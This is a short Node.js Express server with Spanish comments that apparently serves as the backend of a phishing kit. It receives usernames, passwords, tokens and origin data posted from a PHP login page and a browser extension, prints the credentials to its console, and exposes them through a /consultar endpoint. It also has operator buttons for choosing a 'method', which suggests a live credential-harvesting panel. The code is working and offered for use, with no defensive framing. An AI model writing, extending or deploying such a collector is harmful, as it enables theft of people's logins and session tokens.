const express = require('express');
const cors = require('cors'); 
const app = express();

app.use(cors()); 
app.use(express.urlencoded({ extended: true })); // Lee el user.php (nombre/contra)
app.use(express.json()); // Lee los botones (metodo)

let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false,
    metodo: null 
};

app.post('/recibir', (req, res) => {
    const data = req.body;

    // RESPETAMOS TUS VARIABLES DE PHP
    if (data.nombre) baseDeDatosTemporal.user = data.nombre; // Si viene 'nombre', guárdalo como user
    if (data.contra) baseDeDatosTemporal.pass = data.contra; // Si viene 'contra', guárdalo como pass
    
    // Si la extensión o los botones mandan estas, también las guarda
    if (data.user) baseDeDatosTemporal.user = data.user;
    if (data.pass) baseDeDatosTemporal.pass = data.pass;
    if (data.origen) baseDeDatosTemporal.origen = data.origen;
    if (data.metodo) baseDeDatosTemporal.metodo = data.metodo;
    if (data.token) baseDeDatosTemporal.token = data.token;

    baseDeDatosTemporal.actualizado = true;

    console.log("===============================");
    console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
    console.log(`🔑 Clave: ${baseDeDatosTemporal.pass}`);
    console.log(`🛠️ Método: ${baseDeDatosTemporal.metodo || "ESPERANDO..."}`);
    console.log("===============================");

    res.status(200).send("OK");
});

// Ruta para los botones, para que NO den 404
app.post('/metodo', (req, res) => {
    const { metodo } = req.body;
    baseDeDatosTemporal.metodo = metodo;
    baseDeDatosTemporal.actualizado = true;
    console.log(`🎯 Botón presionado: ${metodo}`);
    res.status(200).send("OK");
});

app.get('/consultar', (req, res) => { res.json(baseDeDatosTemporal); });

app.post('/limpiar', (req, res) => {
    baseDeDatosTemporal = { user: null, pass: null, token: null, origen: null, actualizado: false, metodo: null };
    res.status(200).send("Limpiado");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`Servidor en puerto ${PORT}`); });
